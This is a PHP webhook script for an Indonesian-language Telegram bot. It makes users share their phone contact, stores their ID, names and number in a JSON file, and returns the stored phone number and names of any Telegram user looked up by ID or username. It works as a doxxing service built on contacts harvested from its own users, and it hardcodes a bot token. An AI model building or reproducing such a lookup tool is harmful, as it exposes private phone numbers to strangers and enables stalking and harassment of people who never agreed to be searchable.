<?php

$token = "6129024629:AAHhPBnZHxM6eyZFIBfEk7jiYnxYIIgvr9Q"; // Ganti dengan token bot Anda
$apiUrl = "https://api.telegram.org/bot" . $token;

$update = json_decode(file_get_contents("php://input"), true);
$data = json_decode(file_get_contents("hasil.json"), true);

if (!$update) {
    exit(); // Keluar jika tidak ada input
}

$message = isset($update["message"]) ? $update["message"] : null;
$chatId = isset($message["chat"]["id"]) ? $message["chat"]["id"] : null;
$firstName = isset($message["from"]["first_name"])
    ? $message["from"]["first_name"]
    : null;
$lastName = isset($message["from"]["last_name"])
    ? $message["from"]["last_name"]
    : null;
$username = isset($message["from"]["username"])
    ? $message["from"]["username"]
    : null;
$contact = isset($message["contact"]) ? $message["contact"] : null;
$contactName = isset($contact["first_name"]) ? $contact["first_name"] : null;
$contactPhoneNumber = isset($contact["phone_number"])
    ? $contact["phone_number"]
    : null;

if (isset($message["text"]) && $message["text"] == "/start") {
    $user = getUserData($chatId);

    if (!$user) {
        sendContactRequest($chatId);
    } else {
        sendMessage(
            $chatId,
            "Halo, " .
                $firstName .
                "! Selamat datang kembali, Silahkan Kirim User ID / Username."
        );
        // sendMenu($chatId);
    }
} elseif ($contact && $contactName == $firstName) {
    $user = [
        "id" => $chatId,
        "first_name" => $firstName,
        "last_name" => $lastName,
        "username" => $username,
        "phone_number" => $contactPhoneNumber,
    ];

    saveUserData($user);
    sendMessage($chatId, "Silahkan Kirim User ID / Username");
    //   sendMenu($chatId);
} elseif (is_numeric($message["text"])) {
    $user = getUserData($chatId);
    if (!$user) {
        sendContactRequest($chatId);
    } else {
            $found = false;
        foreach ($data as $item) {
            if ($item["id"] == $message["text"]) {
                sendMessage(
                $chatId,
                "ID : " .
                    $item["id"] .
                    '
Phone : ' .
                    $item["phone_number"] .
                    '
First Name : ' .
                    $item["first_name"] .
                    '
Last Nane : ' .
                    $item["last_name"] .
                    '
Username : ' .
                    $item["username"]
            );
            $found = true;
            break;
            }
        }
        
        if (!$found) {
        sendMessage(
            $chatId,
            "Data yang anda cari tidak dalam database saya."
        );
    }
    }
} else {
$user = getUserData($chatId);
if (!$user) {
    sendContactRequest($chatId);
} else {
    $found = false;
    foreach ($data as $item) {
        if (
            isset($item["username"]) &&
            strcasecmp($item["username"], $message["text"]) == 0
        ) {
            sendMessage(
                $chatId,
                "ID : " .
                    $item["id"] .
                    '
Phone : ' .
                    $item["phone_number"] .
                    '
First Name : ' .
                    $item["first_name"] .
                    '
Last Nane : ' .
                    $item["last_name"] .
                    '
Username : ' .
                    $item["username"]
            );
            $found = true;
            break;
        }
    }
    if (!$found) {
        sendMessage(
            $chatId,
            "Data yang anda cari tidak dalam database saya."
        );
    }
}

}

function getUserData($chatId)
{
    $json = file_get_contents("hasil.json");
    $data = json_decode($json, true);

    foreach ($data as $user) {
        if ($user["id"] == $chatId) {
            return $user;
        }
    }

    return null;
}
function saveUserData($user)
{
    $json = file_get_contents("hasil.json");
    $data = json_decode($json, true);
    $data[] = $user;
    $json = json_encode($data);
    file_put_contents("hasil.json", $json);
}

function sendMenu($chatId)
{
    $replyMarkup = json_encode([
        "keyboard" => [["TRACK PHONE"]],
        "resize_keyboard" => true,
    ]);

    sendMessage($chatId, "Silakan pilih menu yang tersedia:", $replyMarkup);
}

function sendContactRequest($chatId)
{
    $replyMarkup = json_encode([
        "keyboard" => [
            [
                [
                    "text" => "Bagikan Kontak",
                    "request_contact" => true,
                ],
            ],
        ],
        "resize_keyboard" => true,
    ]);

    sendMessage(
        $chatId,
        "Halo, " . $firstName . "! Silakan bagikan kontak Anda untuk memulai.",
        $replyMarkup
    );
}

function sendMessage($chatId, $text, $replyMarkup = null)
{
    $data = [
        "chat_id" => $chatId,
        "text" => $text,
    ];

    if ($replyMarkup) {
        $data["reply_markup"] = $replyMarkup;
    }

    file_get_contents(
        $GLOBALS["apiUrl"] . "/sendMessage?" . http_build_query($data)
    );
}

?>
